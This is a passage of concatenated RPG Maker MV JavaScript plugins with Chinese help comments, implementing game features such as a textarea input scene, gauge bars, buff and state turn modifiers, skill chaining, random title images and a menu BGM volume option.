	const bw=this._backWindow=new Window_Base(x, y, Graphics.boxWidth-x,h);
	makeDummyWindowProto(bw,true);
	this.addWindow(bw);
	bw.deactivate();
});

t=['position:absolute; margin:0px; border-width:0px; padding:0px; overflow:hidden; '];

k='createDivRoot';
cf(p,k,function f(){
	const d=document,id=this.constructor.name+'-root';
	if(!(this.node_root=d.ge(id))){
		d.body.ac(this.node_root=d.ce('div').sa('id',id));
		this.node_root._onCenterElement=this._updatePos_divRoot;
		Graphics.addAsGameCanvas(this.node_root);
	}
	const st=this.node_root.sa('style',f.tbl[0]).style;
	st.zIndex=1023;
	st.display="";
	return this.updatePos_divRoot();
},t);

k='createTextarea';
cf(p,k,function f(){
	const d=document,id=this.constructor.name+'-textarea';
	if(!(this.node_txta=d.ge(id))){
		this.node_root.ac(this.node_txta=d.ce('textarea').sa('id',id));
		const node=this.node_txta;
		const cbs=f.tbl[0];
		node.onfocus=cbs.onfocus;
		node.onkeydown=cbs.onkeydown;
	}
	this.node_txta.disabled=this.txt_readOnly();
	this.node_txta.value=this.txt_get();
	this.node_txta.ref=this;
	this.updatePos_txtArea();
},[
{
onfocus:function(e){
	if(e.target.style.display==="none" || e.target.ref.txt_readOnly()) return;
	this.ref._stat=1;
	SceneManager.stop();
	const cw=this.ref._commandWindow;
	cw.deactivate();
	cw.select(0);
	Input.isTexting_set();
},
onkeydown:function(e){
	if(e.target.style.display==="none") return;
	if(e.keyCode===27){
		this.ref._fc_endEdit=Graphics.frameCount;
		Graphics._canvas.focus();
		Input.clear();
		TouchInput.clear();
		SceneManager.resume();
		this.ref._commandWindow.activate();
	}
},
},
]);

k='createCommandWindowDiv';
cf(p,k,function f(){
	const d=document,id=this.constructor.name+'-cmdDom';
	if(!(this.node_cmdDom=d.ge(id))){
		this.node_root.ac(this.node_cmdDom=d.ce('button').sa('id',id));
		const node=this.node_cmdDom;
		const cbs=f.tbl[0];
		node.onfocus=cbs.onfocus;
	}
	this.node_cmdDom.ref=this;
	this.updatePos_cmdDom();
},[
{
onfocus:function(e){
	if(e.target.style.display==="none") return;
	this.ref._stat=0;
	const cw=this.ref._commandWindow;
	if(!cw.active){
		this.ref._fc_endEdit=Graphics.frameCount;
		Input.clear();
		TouchInput.clear();
		SceneManager.resume();
		Input.isTexting_clear();
	}
	cw.activate();
},
},
]);

k='_updatePos_divRoot';
cf(p,k,function f(){
	const g=Graphics;
	const r=g.getScale(),c=g._canvas;
	const wd=c.width,hd=c.height,wr=c.offsetWidth,hr=c.offsetHeight;
	
	const st=this.style;
	st.transform="translate("+(-wd>>1)  +"px"+','+(-hd>>1)+"px"+") scale("+r+")";
	st.inset='';
	st.width  =wd           +"px";
	st.height =hd           +"px";
	st.left   =c.offsetLeft +( wr>>1)+"px";
	st.top    =c.offsetTop  +( hr>>1)+"px";
});

k='updatePos_divRoot';
cf(p,k,function f(){
	this.node_root._onCenterElement();
});

k='updatePos_txtArea';
cf(p,k,function f(){
	const fs=this._backWindow.standardFontSize();
	const bw=this._backWindow,st=this.node_txta.sa('style',f.tbl[0][0]+f.tbl[1]+("font-size:"+fs+"px; ")).style;
	const pad=bw.standardPadding(),cssPadding=(fs>>2);
	const x=bw.x+pad,w=bw.width  -(pad<<1);
	const y=bw.y+pad,h=bw.height -(pad<<1);
	st.padding=cssPadding+"px";
	st.width  =(w-(cssPadding<<1))+"px";
	st.height =(h-(cssPadding<<1))+"px";
	st.left   =x+"px";
	st.top    =y+"px";
	st.fontFamily=f.tbl[2];
},[
t,
'resize:none; white-space:pre; word-break:keep-all; text-justify:none; overflow:scroll; text-overflow:clip; background-color:rgba(0,0,0,0); color:#FFFFFF; ',
'MBR刪節號,consolas,細明體,monospace',
]);

k='updatePos_cmdDom';
cf(p,k,function f(){
	const cw=this._commandWindow,st=this.node_cmdDom.sa('style',f.tbl[0][0]+f.tbl[1]).style;
	const pad=0;
	const x=cw.x+pad,w=cw.width  -(pad<<1);
	const y=cw.y+pad,h=cw.height -(pad<<1);
	st.width  =w+"px";
	st.height =h+"px";
	st.left   =x+"px";
	st.top    =y+"px";
},[
t,
"opacity:0; ",
]);

k='_txt_obj';
cf(p,k,function f(txt){
	if(!$gameTemp.scTxt) $gameTemp.scTxt={disabled:false,noCancel:false,res:undefined,val:"",title:undefined,};
	return $gameTemp.scTxt;
});

k='txt_readOnly';
cf(p,k,function f(){
	const obj=this._txt_obj();
	return obj.readOnly || obj.disabled;
});

k='txt_noCancel';
cf(p,k,function f(){
	return this._txt_obj().noCancel;
});

k='txt_get';
cf(p,k,function f(){
	return this._txt_obj().val;
});

k='txt_set';
cf(p,k,function f(txt,res){
	const obj=this._txt_obj();
	obj.val=txt;
	obj.res=res;
});

k='initResult';
cf(p,k,function f(){
	if($gameTemp){
		const obj=this._txt_obj();
		obj.readOnly=obj.readOnly;
		obj.noCancel=obj.noCancel;
		obj.res=undefined;
		if(obj.val===undefined) obj.val="";
		this.txtval_ori=this.txt_get();
	}else this.txtval_ori="";
});

t=undefined;
} // Scene_HTML_textarea


})();


﻿"use strict";
/*:
 * @plugindesc 類比條
 * @author agold404
 * @help 'SceneManager.add類比條(id,afterThis,x,y,width,height,func_ratioGetter,color01,rot);'
 * rot === 0 時為水平，正值往順時針轉， 2 pi 一圈， xy 定位直接無腦 = ， xy 定位與旋轉中心在正中央。
 * color01 為長度 2~3 的陣列，內填 CSS 顏色。 越 0 偏 color01[0] ，越 1 偏 color01[1] 。 color01[2] 是背景，預設透明。
 * func_ratioGetter 必須是函式，不做型態錯誤檢查。 回傳值 0~1 ，超過範圍會自動切掉縮進範圍內，當不了數字會當 0 。
 * afterThis 為 false like 時會用 'SceneManager._scene.addChild(類比條)' ；其他情形 'afterThis.parent.addChildAt(類比條,afterThis.parent.getChildIndex(afterThis)+1);'
 * id 是拿來:
 *   'SceneManager.get類比條(id)' 拿 sprite 用的。
 *   'SceneManager.del類比條(id)' 刪 sprite 用的。
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const a=function Window_類比條(){
	this.initialize.apply(this,arguments);
};
a.ori=Window_Base;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
makeDummyWindowProto(p);
cf(cf(p,'contentsWidth',function(){
	return this.width;
}),'contentsHeight',function(){
	return this.height;
});
}

{ const p=SceneManager;
r=Window_Base; (t=function f(){
	if(!this.contents || this._lastFc===Graphics.frameCount) return;
	this._lastFc=Graphics.frameCount;
	const curr=(this.getRatio()-0).clamp(0,1)||0;
	if(this._lastValue===curr) return;
	this._lastValue=curr;
	this.contents.clear();
	if(this._color01[2]) this.contents.fillRect(0, 0, this.width, this.height, this._color01[2]);
	{
		const context=this.contents._context;
		const grad=this._lastCtx===context?this._lastGrad:context.createLinearGradient(0, 0, this.width, this.height);
		grad.addColorStop(0, this._color01[0]);
		grad.addColorStop(1, this._color01[1]);
		context.save();
		context.fillStyle=grad;
		context.fillRect(0,0, this.width*curr, this.height);
		context.restore();
		this.contents._setDirty();
		this._lastCtx=context;
		this._lastGrad=grad;
	}
}).ori=r.prototype.update;
cf(cf(cf(p,'add類比條',function f(id,afterThis,x,y,width,height,func_ratioGetter,color01,rot){
	const sp=new Window_類比條(x,y,width,height);
	makeDummyWindowProto(sp);
	sp.children.map(f.tbl[0]);
	{ const cc=sp._windowContentsSprite; cc.y=cc.x=0; f.tbl[1](cc); cc.visible=true; }
	sp.update=f.tbl[2];
	sp.getRatio=func_ratioGetter;
	sp._color01=color01;
	sp.rotation=rot||0;
	let p;
	if(afterThis){
		p=afterThis.parent;
		p.addChild(sp,p.getChildIndex(afterThis)+1);
	}else if(this._scene) (p=this._scene).addChild(sp);
	if(p){
		let m=this._scene._類比條; if(!m) m=this._scene._類比條=new Map();
		if(m.has(id)) this.del類比條(id,sp);
		else m.set(id,sp);
	}
},[x=>x.visible=false, x=>x.anchor && (x.anchor.y=x.anchor.x=0.5), t, ]),'get類比條',function(id){
	const sc=this._scene;
	const m=sc&&sc._類比條;
	return m&&m.get(id);
}),'del類比條',function(id,replaceTo){
	const sp=this.get類比條(id); if(!sp) return;
	if(replaceTo) this._scene._類比條.set(id,replaceTo);
	if(sp.parent) sp.parent.removeChild(sp);
});
}

})();


﻿"use strict";
/*:
 * @plugindesc 使buff/debuff/狀態回合數每次減少時額外減少，或使用負值來增加。
 * @author agold404
 * @help 在有traits的東西的note
 * <狀態回合數額外減少:[[狀態1ㄉid,額外量],[狀態2ㄉid,額外量],...]>
 * <狀態回合數額外減少all:額外量>
 *
 * buff/debuff 順序: mhp,mmp,atk,def,mat,mdf,agi,luk
 *
 * <buff回合數額外減少:[[buff1ㄉid_從0開始數,額外量]]>
 * <buff回合數額外減少all:額外量>
 * <debuff回合數額外減少:[[buff1ㄉid_從0開始數,額外量]]>
 * <debuff回合數額外減少all:額外量>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kw='狀態回合數額外減少';
const kwBuff='buff回合數額外減少';
const kwDebuff='debuff回合數額外減少';
const kw_main='get_'+kw;
const kwBuff_main='get_'+kwBuff;
const kwDebuff_main='get_'+kwDebuff;
const kwAll=kw+'all';
const kwBuffAll=kwBuff+'all';
const kwDebuffAll=kwDebuff+'all';
const kwAll_main='get_'+kwAll;
const kwBuffAll_main='get_'+kwBuffAll;
const kwDebuffAll_main='get_'+kwDebuffAll;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.addEnum(kw).addEnum(kwAll);
gbb.addEnum(kwBuff).addEnum(kwBuffAll);
gbb.addEnum(kwDebuff).addEnum(kwDebuffAll);
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
for(let x=0;x!==3;++x){
	$dataActors  .forEach(f.tbl[x]);
	$dataClasses .forEach(f.tbl[x]);
	$dataSkills  .forEach(f.tbl[x]);
	$dataItems   .forEach(f.tbl[x]);
	$dataWeapons .forEach(f.tbl[x]);
	$dataArmors  .forEach(f.tbl[x]);
	$dataEnemies .forEach(f.tbl[x]);
	$dataTroops  .forEach(f.tbl[x]);
	$dataStates  .forEach(f.tbl[x]);
}
	return f.ori.apply(this,arguments);
}).ori=r;
t=p[k].tbl=[
function f(dataobj){ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts) return;
	if(meta[kw]) JSON.parse(meta[kw]).forEach(f.tbl[0],ts);
	const val=meta[kwAll]-0;
	if(val) ts.push({code:gbb[kwAll],dataId:0,value:val});
},
function f(dataobj){ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts) return;
	if(meta[kwBuff]) JSON.parse(meta[kwBuff]).forEach(f.tbl[1],ts);
	const val=meta[kwBuffAll]-0;
	if(val) ts.push({code:gbb[kwBuffAll],dataId:0,value:val});
},
function f(dataobj){ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts) return;
	if(meta[kwDebuff]) JSON.parse(meta[kwDebuff]).forEach(f.tbl[2],ts);
	const val=meta[kwDebuffAll]-0;
	if(val) ts.push({code:gbb[kwDebuffAll],dataId:0,value:val});
},
];
t[0].ori=undefined;
t[0].tbl=[
function(p){ const ts=this;
	const val=p[1]-0;
	if(val) ts.push({code:gbb[kw],dataId:p[0],value:val});
},
function(p){ const ts=this;
	const val=p[1]-0;
	if(val) ts.push({code:gbb[kwBuff],dataId:p[0],value:val});
},
function(p){ const ts=this;
	const val=p[1]-0;
	if(val) ts.push({code:gbb[kwDebuff],dataId:p[0],value:val});
},
];
for(let x=1;x!==3;++x){
	t[x].ori=undefined;
	t[x].tbl=t[0].tbl;
}
t=undefined;
}

{ const p=Game_BattlerBase.prototype;

cf(cf(p,kw_main,function f(id){
	const rtv=this.traitsSum(f.tbl[0],id);
	return rtv||0;
},[gbb[kw],]),kwAll_main,function f(){
	const rtv=this.traitsSum(f.tbl[0],0);
	return rtv||0;
},[gbb[kwAll],]);

cf(cf(p,kwBuff_main,function f(id){
	const rtv=this.traitsSum(f.tbl[0],id);
	return rtv||0;
},[gbb[kwBuff],]),kwBuffAll_main,function f(){
	const rtv=this.traitsSum(f.tbl[0],0);
	return rtv||0;
},[gbb[kwBuffAll],]);

cf(cf(p,kwDebuff_main,function f(id){
	const rtv=this.traitsSum(f.tbl[0],id);
	return rtv||0;
},[gbb[kwDebuff],]),kwDebuffAll_main,function f(){
	const rtv=this.traitsSum(f.tbl[0],0);
	return rtv||0;
},[gbb[kwDebuffAll],]);

}

{ const p=Game_Battler.prototype;
k='updateStateTurns';
// targeting to most top-0x1
let fp=p[k],fc=p[k].ori;
while(fc){
	if(fc.ori){
		fp=fc;
		fc=fc.ori;
	}else break;
}
(fp.ori=function f(){
	this._states.forEach(f.tbl[1],this);
	{
		const val=this[f.tbl[2]]()||0;
		if(val) this._states.forEach(f.tbl[3].bind(this,val));
	}
	return f.ori.apply(this,arguments);
}).ori=fc;
t=fp.ori.tbl=[
kw_main,
function f(id){
	const dataobj=$dataStates[id];
	if( dataobj && dataobj.autoRemovalTiming===f.ori[0]){
		if( 0<(this._stateTurns[id]-=this[f.tbl[0]](id)) ) ;
		else this._stateTurns[id]=0;
	}
},
kwAll_main,
function f(val,id){
	const dataobj=$dataStates[id];
	if( dataobj && dataobj.autoRemovalTiming===f.ori[0]){
		if( 0<(this._stateTurns[id]-=val) ) ;
		else this._stateTurns[id]=0;
	}
},
];
t[1].ori=t[3].ori=[2];
t[1].tbl=t;

cf(p,'updateBuffTurns',function f(){
	let arr=this._buffTurns,hasPos=0,hasNeg=0,deltas=[]; deltas.length=8;
	for(let x=0;x!==arr.length;++x){
		const rate=this.buff(x);
		if(!rate){ deltas[x]=0; continue; }
		const idx=1-(0<rate);
		deltas[x]=this[f.tbl[idx][0]](x);
		if(idx) hasNeg=1;
		else hasPos=1;
	}
	if(hasPos) hasPos=this[f.tbl[0][1]]();
	if(hasNeg) hasNeg=this[f.tbl[1][1]]();
	for(let x=0;x!==arr.length;++x) arr[x]-=deltas[x]+(0<this.buff(x)?hasPos:hasNeg);
	return f.ori.apply(this,arguments);
},[[kwBuff_main,kwBuffAll_main],[kwDebuff_main,kwDebuffAll_main],],true);

t=undefined;
}

})();


﻿"use strict";
/*:
 * @plugindesc hp2
 * @author agold404
 * @help basic system
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Battler.prototype;
cf(cf(cf(cf(cf(p,'initMembers',function f(id){
	const rtv=f.ori.apply(this,arguments);
	this._hp2=0;
	this._hp2_valid=false;
	return rtv;
},undefined,true),'setHp2',function(val){ if(this._hp2!==val){
	this._hp2=val;
	// this.refresh();
} },undefined,true),'gainHp2',function(val){
	this.setHp2(this.getHp2()+val);
},undefined,true),'setHp2_newInit',function(val){
	if(!(val<this._hp2)) this.setHp2(val);
},undefined,true),'getHp2',function(){
	return this._hp2||0;
},undefined,true);
cf(p,'gainHp_merged',function f(value){
	if(this._hp2_valid && value<0){
		const hp2=this.getHp2();
		if(0<hp2){
			const m=Math.min(hp2,-value);
			arguments[0]+=m;
			this.gainHp2(-m);
		}
	}
	return f.ori.apply(this,arguments);
},undefined,true);
}

{ const p=Game_Action.prototype;
cf(p,'executeHpDamage',function f(trgt,val){
	trgt._hp2_valid=true;
	const rtv=f.ori.apply(this,arguments);
	trgt._hp2_valid=false;
	return rtv;
},undefined,true);
}

})();


﻿"use strict";
/*:
 * @plugindesc 隨機標題圖。
 * @author agold404
 * @help 清單位於 BLR_custom/Titles/TitlePicsList.txt
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const listPath="BLR_custom/Title/TitlePicsList.txt";

t=[
"titleCond",
];

new cfc(ConfigManager).add('titleCond_clear',function f(key){
	this[f.tbl[0]]=undefined;
	this._titleCond_keyMap_get().clear();
},t).add('titleCond_get',function f(key){
	const obj=this[f.tbl[0]];
	return Number(obj&&obj[key])||0;
},t).add('_titleCond_keyMap_get',function f(){
	if(!this._titleCond_keyMap){
		this._titleCond_keyMap=new Map();
		const obj=this[f.tbl[0]];
		if(obj) for(let k in obj) if(Object.prototype.hasOwnProperty.call(obj,k)) this._titleCond_keyMap.set(k,obj[k]);
	}
	return this._titleCond_keyMap;
},t).add('titleCond_set',function f(key,val){
	const rtv=Number(val);
	if(isNaN(rtv)) return 0;
	const m=this._titleCond_keyMap_get();
	if(!this[f.tbl[0]]) this[f.tbl[0]]={};
	m.set(''+key,this[f.tbl[0]][key]=''+val);
	this.save();
	return rtv;
},t).add('titleCond_setMax',function f(key,val){
	return this.titleCond_set(key,Math.max(this.titleCond_get(key),Number(val)||0));
},t).add('makeData',function f(){
	const rtv=f.ori.apply(this,arguments);
	const m=this._titleCond_keyMap_get();
	if(m.size) rtv[f.tbl[0]]=this[f.tbl[0]]; // don't set if empty
	return rtv;
},t).add('applyData',function f(){ // arg0 === config
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[0]]=arguments[0][f.tbl[0]];
	this._titleCond_keyMap_get();
	return rtv;
},t);

r=t;

cf(Scene_Boot.prototype,'start',function f(){
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return f.ori.apply(this,arguments);
},t=[
listPath,
function f(data){
	return data&&data.replace(f.tbl[0][0],f.tbl[0][1]).split(f.tbl[1]).map(f.tbl[2]).filter(f.tbl[3]);
},
"",
function f(group){
	if(!group) return false;
	if(!group[2]) return true;
	const cm=ConfigManager;
	const m=cm._titleCond_keyMap_get();
	try{
		return f.tbl[0](group[2],cm[f.tbl[1]]||{});
	}catch(e){
		console.warn(group.join('\n'));
	}
	return true;
}, // filter by condition
]);

t[1].ori=undefined;
t[1].tbl=[
[/\r/g,''],
/\n\n+/,
group=>group.split('\n').map((line,i)=>i<2?line.split("#")[0]:line),
lines=>lines&&lines[0],
];

t[3].ori=undefined;
t[3].tbl=[
(s,cond)=>eval(s),
r[0],
];

cf(cf(Scene_Title.prototype,'create',function f(){
	this.create_customTitle();
	return f.ori.apply(this,arguments);
}),'create_customTitle',function f(){
	if(!(f.tbl.length>=5)) f.tbl.push( f.tbl[1](ImageManager.otherFiles_getData(f.tbl[0])) );
	if(!f.tbl[4]){ while(f.tbl.length>=5) f.tbl.pop(); return; }
	const ch=f.tbl[4].filter(f.tbl[3]).rnd1();
	$dataSystem.title1Name=ch[0];
	$dataSystem.title2Name=ch[1]||f.tbl[2]; // ""
},t);

t=r=undefined;
})();


﻿"use strict";
/*:
 * @plugindesc [for月藍]menu scene (some)
 * @author agold404
 * @help 旋轉魔法陣
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

cf(cf(Scene_MenuBase.prototype,'_createBackground_common_after',function f(imgMgrLoaderFunc){
	if(!imgMgrLoaderFunc) return;
	this.addChild(this._magicCircle=new Sprite(imgMgrLoaderFunc.call(ImageManager,"MagicCircle")));
	this.addChild(this._title=new Sprite(imgMgrLoaderFunc.call(ImageManager,"Title")));
	this._magicCircle.bitmap.addLoadListener(f.tbl[1].bind(this));
	this._magicCircle_rotSpeed=f.tbl[0][0]; // >=0
},[
[1.0/(1<<11),],
function(bm){
	const sp=this._magicCircle,sp2=this._title;
	{ const w=bm.width,h=bm.height; sp.x+=w>>1; sp.y+=h>>1; }
	{ const a=sp.anchor; a.y=a.x=0.5; }
	{ sp2.x=sp.x; sp2.y=sp.y; }
	{ const a=sp2.anchor; a.y=a.x=0.5; }
},
]),'update',function f(){
	{ const sp=this._magicCircle; if(sp){
		sp.rotation+=this._magicCircle_rotSpeed;
		if(sp.rotation>=360) sp.rotation-=360;
	} }
	return f.ori.apply(this,arguments);
});

t=[Scene_Skill,Scene_Item,Scene_Equip,Scene_Status,].map(sc=>[sc.prototype]);
r=ImageManager;
t[0].push(r.loadMenusskill);
t[1].push(r.loadMenusitem);
t[2].push(r.loadMenusequip);
t[3].push(r.loadMenusstatus);
t.forEach(info=>cf(cf(info[0],'createBackground',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._createBackground_common_after(info[1]);
	return rtv;
}),'update',function f(){
	{ const sp=this._magicCircle; if(sp){
		sp.rotation+=this._magicCircle_rotSpeed;
		if(sp.rotation>=360) sp.rotation-=360;
	} }
	return f.ori.apply(this,arguments);
}));

})();


﻿"use strict";
/*:
 * @plugindesc 正向buff免疫(調整獲得機率)
 * @author agold404
 * @help 有traits的note區
 * <buffRates:[[id,獲得機率倍率],[id,獲得機率倍率],...]>
 * e.g.
 * <buffRates:[[1,0.25],[0,0.5]]>
 * // ^ mhp獲得機率倍率 * 0.5 , mmp獲得機率倍率 * 0.25
 * <buffRates:[["def",0.25],["atk",0.5]]>
 * // ^ atk獲得機率倍率 * 0.5 , def獲得機率倍率 * 0.25
 * <buffRates:[["atk",0.25],["atk",0.5]]>
 * // ^ atk獲得機率倍率 * 0.125
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kw='buffRates';
const kw_main='get_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.addEnum(kw);
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
function f(dataobj){ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts||!meta[kw]) return;
	const arr=JSON.parse(meta[kw]);
	for(let x=0;x!==arr.length;++x) dataobj.traits.push({code:gbb[kw],dataId:f.tbl[arr[x][0]],value:arr[x][1]});
},
];
t=p[k].tbl[0];
t.ori=undefined;
t=t.tbl={};
for(let x=0,arr=['mhp','mmp','atk','def','mat','def','agi','luk',];x!==arr.length;++x) t[arr[x]]=t[x]=x;
}

cf(Game_BattlerBase.prototype,kw_main,function f(id){
	return this.traitsPi(f.tbl[1],id);
},t=[kw_main,gbb[kw],]);

cf(Game_Action.prototype,'itemEffectAddBuff',function f(trgt, eff){
	return Math.random()<trgt[f.tbl[0]](eff.dataId) && f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 狀態：技能後追加技能 (技能接技能)
 * @author agold404
 * @help 有traits的note區
 * <技能後追加技能:{"使用的技能id":[追加的技能id,追加的技能id, ... ], ... }>
 * 普攻用"普攻"，不要打1，請想想武器普攻技能。
 * 
 * 技能note: <技能後追加技能:[追加的技能id,追加的技能id, ... ]>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kw='技能後追加技能';
const kw_main='get_'+kw;
const kw_action='is_'+kw;
const kw_action_bit="_"+kw_action;
const kw_pend='pend_'+kw;
const kw_push='push_'+kw;
const kw_getQ='getQ_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.addEnum(kw);
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[1]);
	$dataItems   .forEach(f.tbl[1]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=meta[kw]&&dataobj.traits; if(!ts) return;
	const m=JSON.parse(meta[kw]);
	for(let i in m) if(i) for(let x=0,arr=m[i];x!==arr.length;++x) if(arr[x]) ts.push({code:gbb[kw],dataId:i,value:arr[x]});
},
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	dataobj[kw]=meta[kw]?JSON.parse(meta[kw]):undefined;
},
];
}

cf(cf(cf(Game_BattlerBase.prototype,kw_main,function f(id){
	if(id===this.attackSkillId()) id="普攻";
	return this.traitsWithId(f.tbl[1],id).map(f.tbl[4]);
},t=[kw_main,gbb[kw],kw_action_bit,kw_action,t=>{
	return t.value;
},kw_pend,kw_push,function f(btlr){
	const q=btlr[f.tbl[8]](); if(q) q.clear();
},kw_getQ,kw]),kw_push,function f(fromSkill,lastAct){
	if(!fromSkill) return;
	const s=this,id=fromSkill.id;
	const additionalSkills=s[f.tbl[0]](id).concat(fromSkill[f.tbl[9]]);
	if(!fromSkill[f.tbl[9]]) additionalSkills.pop();
	const acts=s[f.tbl[8]](true);
	if(lastAct){
		const lastIsForFriend=lastAct.isForFriend();
		const lastIsForAll=lastAct.isForAll();
		if(!lastAct[f.tbl[3]]()){ for(let x=0,arr=additionalSkills;x!==arr.length;++x){
			const id=arr[x]==="普攻"?this.attackSkillId():arr[x];
			if(!$dataSkills[arr[x]]) continue;
			const act=new Game_Action(s);
			act[f.tbl[2]]=true;
			act.setSkill(arr[x]);
			if(lastIsForFriend===act.isForFriend()) act._targetIndex=lastAct._targetIndex;
			acts.push(act);
		} }
	}
	if(acts.length && !s._actions.length){
		s._actions.push(acts[0]);
		acts.pop();
		return true;
	}
},t),kw_getQ,function f(newItIfUndef){
	if(this[f.tbl[5]]){
		if(this[f.tbl[5]].constructor!==Queue) this[f.tbl[5]]=Object.assign(new Queue(),this[f.tbl[5]]);
	}else if(newItIfUndef) this[f.tbl[5]]=new Queue();
	return this[f.tbl[5]];
},t);
for(let x=0;x!==t.length;++x){ if(typeof t[x]==='function'){
	t[x].ori=undefined;
	t[x].tbl=t;
} }

new cfc(Game_Battler.prototype).add('makeActions',function f(){
	this[f.tbl[8]](true);
	return f.ori.apply(this,arguments);
},t).add('onBattleEnd',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.onBattleEnd_技能後追加技能();
	return rtv;
}).add('onBattleEnd_技能後追加技能',function f(){
	const q=this[f.tbl[8]](); if(q) q.clear();
},t);

cf(cf(Game_Action.prototype,kw_action,function f(){
	return false; // always add
	return !!this[f.tbl[2]];
},t),'initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[2]]=false;
	return rtv;
},t);

cf(BattleManager,'endAction',function f(){
	const a=this._action;
	const s=a&&a.subject();
	const skill=s&&a.isSkill()&&a.item();
	const rtv=f.ori.apply(this,arguments);
	if(s && s[f.tbl[6]](skill,a)) this.startAction();
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc [for月藍]equip scene
 * @author agold404
 * @help 說明欄z層
 * 
 * This plugin can be renamed as you want.
 */

if(0)(()=>{ let k,r,t;

cf(Scene_Equip.prototype,'create',function f(){
	const rtv=f.ori.apply(this,arguments);
	const hw=this._layoutHelp;
	const p=hw&&hw.parent; if(!p) return rtv;
	p.removeChild(hw);
	p.addChild(hw);
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 升級獲得的技能不在可用技能類別中則不顯示獲得提示
 * @author agold404
 * @help 還有把 findNewSkills 改成 O((n+m)*lg(n)) ; n>=m>=0
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

cf(cf(Game_Actor.prototype,'displayLevelUp',function f(){
	const skillTypes=new Set(this.addedSkillTypes());
	arguments[0]=arguments[0].filter(f.tbl[0],skillTypes);
	return f.ori.apply(this,arguments);
},[ function(dataSkill){
	return this.has(dataSkill.stypeId);
}, ]),'findNewSkills',function f(lastSkills){
	return this.skills().filter(f.tbl[0],new Set(lastSkills));
},[ function(dataSkill){
	return !this.has(dataSkill);
}, ]);

})();


﻿"use strict";
/*:
 * @plugindesc 新增選項：開選單的時候bgm降x%，預設=25%
 * @author agold404
 * @help 只有 [Scene_Title,Scene_Map,Scene_Battle,Scene_Gameover,] 不會降
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const optionTitle="選單內降低bgm音量",defaultDecPercent=25;
const optionSymbol="Volume-"+optionTitle;
const optionSymbolKey="_"+optionSymbol;
const optionSymbolKeyRate="rate_"+optionSymbolKey;
const updateBgmVol="updateBgmVol";

cf(Window_Options.prototype,'addVolumeOptions',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.addCommand(f.tbl[0], f.tbl[2]);
	return rtv;
},t=[optionTitle,defaultDecPercent,optionSymbol,updateBgmVol,]);

k='defineProperty';
r=ConfigManager;
cf(cf(cf(r,'makeData',function f(){
	const rtv=f.ori.apply(this,arguments);
	rtv[f.tbl[2]]=this[f.tbl[2]]||0;
	return rtv;
},t),'applyData',function f(){
	const rtv=f.ori.apply(this,arguments);
	const val=arguments[0][f.tbl[2]];
	this[f.tbl[2]]=isNaN(val)?f.tbl[1]:Number(val);
	return rtv;
},t),t[3],function f(){
	AudioManager.bgmVolume=this.bgmVolume*this[optionSymbolKeyRate];
	return f.ori&&f.ori.apply(this,arguments);
});

Object[k](r, 'bgmVolume', {
